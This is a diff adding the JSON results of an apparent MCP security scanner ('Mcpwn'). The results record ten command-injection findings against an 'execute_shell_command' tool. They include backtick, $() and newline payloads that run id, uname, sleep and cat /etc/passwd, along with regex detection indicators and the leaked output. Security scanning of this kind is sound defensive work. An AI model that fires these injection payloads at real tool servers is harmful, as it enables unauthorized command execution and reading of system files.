@@ -1,0 +1,205 @@
+{
+  "tool": "Mcpwn",
+  "version": "1.0",
+  "timestamp": "2026-10-19T17:10:36.715546+00:00",
+  "findings": [
+    {
+      "tool": "execute_shell_command",
+      "arg": "command",
+      "payload": "`id`",
+      "type": "RCE",
+      "category": "command_injection",
+      "severity": "CRITICAL",
+      "detections": [
+        {
+          "type": "RCE",
+          "indicator": "uid=\\d+\\([^)]+\\)",
+          "match": "uid=1001(targetuser)"
+        }
+      ],
+      "test": "tool_injection",
+      "timestamp": "2026-10-19T17:10:33.903558+00:00"
+    },
+    {
+      "tool": "execute_shell_command",
+      "arg": "command",
+      "payload": "$(id)",
+      "type": "RCE",
+      "category": "command_injection",
+      "severity": "CRITICAL",
+      "detections": [
+        {
+          "type": "RCE",
+          "indicator": "uid=\\d+\\([^)]+\\)",
+          "match": "uid=1001(targetuser)"
+        }
+      ],
+      "test": "tool_injection",
+      "timestamp": "2026-10-19T17:10:33.903608+00:00"
+    },
+    {
+      "tool": "execute_shell_command",
+      "arg": "command",
+      "payload": "\nid",
+      "type": "RCE",
+      "category": "command_injection",
+      "severity": "CRITICAL",
+      "detections": [
+        {
+          "type": "RCE",
+          "indicator": "uid=\\d+\\([^)]+\\)",
+          "match": "uid=1001(targetuser)"
+        },
+        {
+          "type": "RCE",
+          "indicator": "gid=\\d+\\([^)]+\\)",
+          "match": "gid=1001(targetuser)"
+        },
+        {
+          "type": "RCE",
+          "indicator": "groups=\\d+",
+          "match": "groups=1001"
+        }
+      ],
+      "test": "tool_injection",
+      "timestamp": "2026-10-19T17:10:33.903614+00:00"
+    },
+    {
+      "tool": "execute_shell_command",
+      "arg": "command",
+      "payload": "\nuname -a",
+      "type": "RCE",
+      "category": "command_injection",
+      "severity": "CRITICAL",
+      "detections": [
+        {
+          "type": "RCE",
+          "indicator": "Linux.*\\d+\\.\\d+\\.\\d+",
+          "match": "Linux a5a1a7e6540f 6.18.54.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Tue Oct  6 19:13:07 UTC 2026 x86_64 GNU/Linux\\n\"}],\"structuredContent\":{\"result\":\"Command executed successfully:\\n\\nLinux a5a1a7e6540f 6.18.54.1"
+        },
+        {
+          "type": "RCE",
+          "indicator": "GNU/Linux",
+          "match": "GNU/Linux"
+        }
+      ],
+      "test": "tool_injection",
+      "timestamp": "2026-10-19T17:10:33.903619+00:00"
+    },
+    {
+      "tool": "execute_shell_command",
+      "arg": "command",
+      "payload": "`sleep 10`",
+      "type": "BLIND_RCE_TIMING",
+      "category": "BLIND_RCE_TIMING",
+      "severity": "HIGH",
+      "detections": [
+        "Timing delay: 10.45s"
+      ],
+      "test": "tool_injection",
+      "timestamp": "2026-10-19T17:10:33.903624+00:00"
+    },
+    {
+      "tool": "execute_shell_command",
+      "arg": "command",
+      "payload": "`sleep 10`",
+      "type": "TIMING",
+      "category": "command_injection",
+      "severity": "LOW",
+      "detections": [
+        {
+          "type": "TIMING",
+          "elapsed": 10.445823192596436
+        }
+      ],
+      "test": "tool_injection",
+      "timestamp": "2026-10-19T17:10:33.903628+00:00"
+    },
+    {
+      "tool": "execute_shell_command",
+      "arg": "command",
+      "payload": "$(sleep 10)",
+      "type": "BLIND_RCE_TIMING",
+      "category": "BLIND_RCE_TIMING",
+      "severity": "HIGH",
+      "detections": [
+        "Timing delay: 10.01s"
+      ],
+      "test": "tool_injection",
+      "timestamp": "2026-10-19T17:10:33.903635+00:00"
+    },
+    {
+      "tool": "execute_shell_command",
+      "arg": "command",
+      "payload": "$(sleep 10)",
+      "type": "TIMING",
+      "category": "command_injection",
+      "severity": "LOW",
+      "detections": [
+        {
+          "type": "TIMING",
+          "elapsed": 10.0054771900177
+        }
+      ],
+      "test": "tool_injection",
+      "timestamp": "2026-10-19T17:10:33.903641+00:00"
+    },
+    {
+      "tool": "execute_shell_command",
+      "arg": "command",
+      "payload": "$(cat /etc/passwd)",
+      "type": "RCE",
+      "category": "command_injection",
+      "severity": "CRITICAL",
+      "detections": [
+        {
+          "type": "RCE",
+          "indicator": "root:.*:0:0",
+          "match": "root:x:0:0:root:/root:/bin/bash: not found\\n\"}],\"structuredContent\":{\"result\":\"Error executing command: /bin/sh: 1: root:x:0:0"
+        },
+        {
+          "type": "FILE_READ",
+          "indicator": "root:x:",
+          "match": "root:x:"
+        }
+      ],
+      "test": "tool_injection",
+      "timestamp": "2026-10-19T17:10:33.903645+00:00"
+    },
+    {
+      "tool": "execute_shell_command",
+      "arg": "command",
+      "payload": "`cat /etc/passwd`",
+      "type": "RCE",
+      "category": "command_injection",
+      "severity": "CRITICAL",
+      "detections": [
+        {
+          "type": "RCE",
+          "indicator": "root:.*:0:0",
+          "match": "root:x:0:0:root:/root:/bin/bash: not found\\n\"}],\"structuredContent\":{\"result\":\"Error executing command: /bin/sh: 1: root:x:0:0"
+        },
+        {
+          "type": "FILE_READ",
+          "indicator": "root:x:",
+          "match": "root:x:"
+        }
+      ],
+      "test": "tool_injection",
+      "timestamp": "2026-10-19T17:10:33.903649+00:00"
+    }
+  ],
+  "summary": {
+    "total": 10,
+    "by_type": {
+      "RCE": 6,
+      "BLIND_RCE_TIMING": 2,
+      "TIMING": 2
+    },
+    "by_severity": {
+      "CRITICAL": 6,
+      "HIGH": 2,
+      "LOW": 2
+    }
+  }
+}
